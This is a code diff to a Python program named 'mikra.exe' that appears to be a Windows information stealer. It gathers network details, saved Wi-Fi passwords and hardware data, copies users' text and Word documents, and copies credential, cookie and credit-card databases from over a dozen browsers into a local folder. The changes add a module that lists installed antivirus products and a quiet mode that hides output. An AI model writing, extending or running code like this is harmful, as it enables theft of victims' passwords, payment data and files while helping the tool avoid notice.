@@ -24,7 +24,7 @@ from shutil import copyfile
 try:
     if __name__ == "__main__":
         if "all" in str(sys.argv) or "network" in str(sys.argv) or "hardware" in str(sys.argv) or "filegraber" in str(
-                sys.argv) or "browsers" in str(sys.argv):
+                sys.argv) or "browsers" in str(sys.argv) or "antisoftware" in str(sys.argv):
             starttime = time.time()
             windll = ctypes.windll.kernel32
             lang = locale.windows_locale[windll.GetUserDefaultUILanguage()]
@@ -42,6 +42,7 @@ try:
             dio = dirname
             os.makedirs(dirname)
 
+
             def get_eip():
                 try:
                     global eip
@@ -50,7 +51,10 @@ try:
                     eip = rl["ip"]
                 except Exception:
                     return None
+
+
             get_eip()
+
 
             def get_bssid():
                 try:
@@ -60,6 +64,8 @@ try:
                     bssidstr = str(output[9].split()[2])
                 except Exception:
                     return None
+
+
             get_bssid()
 
             if "-q" not in str(sys.argv):
@@ -78,6 +84,7 @@ try:
                 print("	Hostname: ", hostname)
                 print(" 	Username: ", user)
                 print(" 	Language: ", lang)
+
 
             def creatinglog():
                 global logfile
@@ -99,7 +106,9 @@ try:
 	Username: {3}
 	Language: {4}""".format(timedate, typeos, hostname, user, lang))
 
+
             creatinglog()
+
 
             def networkpass(one, two):
                 try:
@@ -126,6 +135,7 @@ try:
                 except Exception:
                     pass
 
+
             if "all" in str(sys.argv) or "network" in str(sys.argv):
                 if "-q" not in str(sys.argv):
                     print(" 	{~} Network: ")
@@ -133,7 +143,7 @@ try:
                     print(" 	 Internal ip: ", iip)
                     print(" 	 Gateway ip: ", gatewayip)
                     print(" 	 BSSID: %s" % bssidstr)
-                    logfile.write("""
+                logfile.write("""
     {0} Network: 
      External ip: {1}
      Internal ip: {2}
@@ -151,6 +161,10 @@ try:
                     logfile.write("	 ]")
 
             if "all" in str(sys.argv) or "hardware" in str(sys.argv):
+                if "-q" not in str(sys.argv):
+                    print(" 	{~} Hardware: ")
+
+
                 def get_cpu_type():
                     root_winmgmts = GetObject("winmgmts:root\cimv2")
                     cpus = root_winmgmts.ExecQuery("Select * from Win32_Processor")
@@ -165,23 +179,27 @@ try:
                         bytes /= factor
 
 
-                gpus = GPUtil.getGPUs()
-                for gpu in gpus:
-                    gpu_name = gpu.name
+                try:
+                    gpus = GPUtil.getGPUs()
+                    for gpu in gpus:
+                        gpu_name = gpu.name
 
-                svmem = psutil.virtual_memory()
-                print(" 	{~} Hardware: ")
-                print(" 	 CPU: ", get_cpu_type())
-                print(" 	 GPU: ", gpu_name)
-                print(" 	 RAM: ", get_size(svmem.total))
-                print(" 	 Resolution: ", str(GetSystemMetrics(0)) + " x " + str(GetSystemMetrics(1)))
-                logfile.write("""
+                    svmem = psutil.virtual_memory()
+                    if "-q" not in str(sys.argv):
+                        print(" 	 CPU: ", get_cpu_type())
+                        print(" 	 GPU: ", gpu_name)
+                        print(" 	 RAM: ", get_size(svmem.total))
+                        print(" 	 Resolution: ", str(GetSystemMetrics(0)) + " x " + str(GetSystemMetrics(1)))
+                    logfile.write("""
     {0} Hardware:
      CPU: {1}
      GPU: {2}
      RAM: {3}
      Resolution: {4}""".format(prefix, get_cpu_type(), gpu_name, get_size(svmem.total),
                                str(GetSystemMetrics(0)) + " x " + str(GetSystemMetrics(1))))
+                except Exception as ex:
+                    print(ex)
+
 
             def findall(pattern, path, pok):
                 global result
@@ -195,6 +213,7 @@ try:
                                 result += 1
                             except Exception:
                                 pass
+
 
             if "all" in str(sys.argv) or "filegraber" in str(sys.argv):
                 os.makedirs(dio + "\\Documents")
@@ -215,20 +234,48 @@ try:
      Found .txt: {1}
      Found .docx: {2}""".format(prefix, resst, ressw))
 
+
+            def listanti():
+                try:
+                    global alist
+                    alist = []
+                    acommand = "wmic /node:localhost /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct Get DisplayName"
+                    adata = subprocess.check_output(acommand).decode(encoding).split("\r")[2:-4]
+
+                    if "-q" not in str(sys.argv):
+                        print(" 	{~} Antivirus software: ")
+
+                    logfile.write("""
+    {0} Antivirus software:""".format(prefix))
+
+                    for i in range(len(adata)):
+                        rest = adata[i]
+                        rest = rest.replace("\n", "")
+                        if rest != "" and rest not in alist:
+                            alist.append(rest)
+                            logfile.write("""
+     + {0}""".format(rest))
+                            if "-q" not in str(sys.argv):
+                                print(" 	 + " + rest)
+                except Exception as eex:
+                    print(eex)
+
+
+            if "all" in str(sys.argv) or "antisoftware" in str(sys.argv):
+                listanti()
+
+
             def browsers():
                 def findone(pattern, path, pok):
-                    global result
-                    result = 0
                     for root, dirs, files in os.walk(path):
                         for name in files:
                             if fnmatch.fnmatch(name, pattern):
                                 try:
                                     fileg = os.path.join(root, name)
                                     copyfile(fileg, dio + pok + name)
-                                    result += 1
                                     return True
-                                except Exception as exx:
-                                    print(exx)
+                                except Exception as exxx:
+                                    print(exxx)
                                     return False
 
                 def checkp(title):
@@ -252,8 +299,8 @@ try:
                             checkp(" 	 + Login Data")
                         if findone("Web Data", src, "\\Google Chrome\\"):
                             checkp(" 	 + Web Data")
-                    except Exception as ex:
-                        print(ex)
+                    except Exception as exx:
+                        print(exx)
 
                 if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera GX Stable".format(user)):
                     src = "C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\".format(user)
@@ -272,8 +319,8 @@ try:
                             checkp(" 	 + Login Data")
                         if findone("Web Data", src, "\\Opera GX\\"):
                             checkp(" 	 + Web Data")
-                    except Exception as ex:
-                        print(ex)
+                    except Exception as exx:
+                        print(exx)
 
                 if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera Stable".format(user)):
                     src = "C:\\Users\\{0}\\AppData\\Roaming\\Opera Software\\Opera Stable\\".format(user)
@@ -292,8 +339,8 @@ try:
                             checkp(" 	 + Login Data")
                         if findone("Web Data", src, "\\Opera\\"):
                             checkp(" 	 + Web Data")
-                    except Exception as ex:
-                        print(ex)
+                    except Exception as exx:
+                        print(exx)
 
                 if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Mozilla\\FireFox\\Profiles".format(user)):
                     src = "C:\\Users\\{0}\\AppData\\Roaming\\Mozilla\\FireFox\\Profiles\\".format(user)
@@ -313,8 +360,8 @@ try:
                             checkp(" 	 + Login Data")
                         if findone("formhistory.sqlite", src, "\\Firefox\\"):
                             checkp(" 	 + Form Data")
-                    except Exception as ex:
-                        print(ex)
+                    except Exception as exx:
+                        print(exx)
 
                 if os.path.exists(
                         "C:\\Users\\{0}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default".format(user)):
@@ -340,8 +387,8 @@ try:
                             checkp(" 	 + Credit Cards Data")
                         if findone("Ya Passman Data", src, "\\Yandex\\"):
                             checkp(" 	 + Passman Data")
-                    except Exception as ex:
-                        print(ex)
+                    except Exception as exx:
+                        print(exx)
 
                 if os.path.exists("C:\\Users\\{0}\\AppData\\Local\\Vivaldi\\User Data\\Default".format(user)):
                     src = "C:\\Users\\{0}\\AppData\\Local\\Vivaldi\\User Data\\Default".format(user)
@@ -360,8 +407,8 @@ try:
                             checkp(" 	 + Web Data")
                         if findone("Login Data", src, "\\Vivaldi\\"):
                             checkp(" 	 + Login Data")
-                    except Exception as ex:
-                        print(ex)
+                    except Exception as exx:
+                        print(exx)
 
                 if os.path.exists(
                         "C:/Users/{0}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/".format(user)):
@@ -381,8 +428,8 @@ try:
                             checkp(" 	 + Login Data")
                         if findone("Web Data", src, "\\Brave\\"):
                             checkp(" 	 + Web Data")
-                    except Exception as ex:
-                        print(ex)
+                    except Exception as exx:
+                        print(exx)
 
                 if os.path.exists("C:/Users/{0}/AppData/Local/Google/Chrome SxS/User Data/Default".format(user)):
                     src = "C:/Users/{0}/AppData/Local/Google/Chrome SxS/User Data/Default".format(user)
@@ -401,8 +448,8 @@ try:
                             checkp(" 	 + Login Data")
                         if findone("Web Data", src, "\\Chrome Canary\\"):
                             checkp(" 	 + Web Data")
-                    except Exception as ex:
-                        print(ex)
+                    except Exception as exx:
+                        print(exx)
 
                 if os.path.exists("C:/Users/{0}/AppData/Local/Chromium/User Data/Default".format(user)):
                     src = "C:/Users/{0}/AppData/Local/Chromium/User Data/Default".format(user)
@@ -421,8 +468,8 @@ try:
                             checkp(" 	 + Login Data")
                         if findone("Web Data", src, "\\Chromium\\"):
                             checkp(" 	 + Web Data")
-                    except Exception as ex:
-                        print(ex)
+                    except Exception as exx:
+                        print(exx)
 
                 if os.path.exists("C:/Users/{0}/AppData/Local/CocCoc/Browser/User Data/Default".format(user)):
                     src = "C:/Users/{0}/AppData/Local/CocCoc/Browser/User Data/Default".format(user)
@@ -441,8 +488,8 @@ try:
                             checkp(" 	 + Login Data")
                         if findone("Web Data", src, "\\CocCoc\\"):
                             checkp(" 	 + Web Data")
-                    except Exception as ex:
-                        print(ex)
+                    except Exception as exx:
+                        print(exx)
 
                 if os.path.exists("C:/Users/{0}/AppData/Local/Mail.Ru/Atom/User Data/Default".format(user)):
                     src = "C:/Users/{0}/AppData/Local/Mail.Ru/Atom/User Data/Default".format(user)
@@ -461,8 +508,8 @@ try:
                             checkp(" 	 + Login Data")
                         if findone("Web Data", src, "\\Atom\\"):
                             checkp(" 	 + Web Data")
-                    except Exception as ex:
-                        print(ex)
+                    except Exception as exx:
+                        print(exx)
 
                 if os.path.exists("C:/Users/{0}/AppData/Local/Orbitum/User Data/Default".format(user)):
                     src = "C:/Users/{0}/AppData/Local/Orbitum/User Data/Default".format(user)
@@ -481,8 +528,8 @@ try:
                             checkp(" 	 + Login Data")
                         if findone("Web Data", src, "\\Orbitum\\"):
                             checkp(" 	 + Web Data")
-                    except Exception as ex:
-                        print(ex)
+                    except Exception as exx:
+                        print(exx)
 
                 if os.path.exists("C:/Users/{0}/AppData/Local/Torch/User Data/Default".format(user)):
                     src = "C:/Users/{0}/AppData/Local/Torch/User Data/Default".format(user)
@@ -501,8 +548,9 @@ try:
                             checkp(" 	 + Login Data")
                         if findone("Web Data", src, "\\Torch\\"):
                             checkp(" 	 + Web Data")
-                    except Exception as ex:
-                        print(ex)
+                    except Exception as exx:
+                        print(exx)
+
 
             if "all" in str(sys.argv) or "browsers" in str(sys.argv):
                 browsers()
@@ -515,10 +563,7 @@ try:
             logfile.close()
 
             if "-q" not in str(sys.argv):
-                print(" 	Elapsed time: %s second's" % totaltime)
-                sys.exit(")")
-            else:
-                sys.exit("")
+                print(" 	Elapsed time: %s second's\n)" % totaltime)
         else:
             print("""
 	 ___      ___   __     __   ___   _______        __      
@@ -531,13 +576,14 @@ try:
 
 
 Usage: mikra.exe [-h] [-xh] [-q]
-		 {all, network, hardware, filegraber, browsers}
+		 {all, network, hardware, filegraber, antisoftware, browsers}
 
 Positional arguments:
  all		Launches all modules
  network	Launches network module
  hardware	Launches hardware module
  filegraber	Launches file graber module
+ antisoftware   Launches antisoftware module
  browsers	Launches browsers module
 
 Optional arguments:
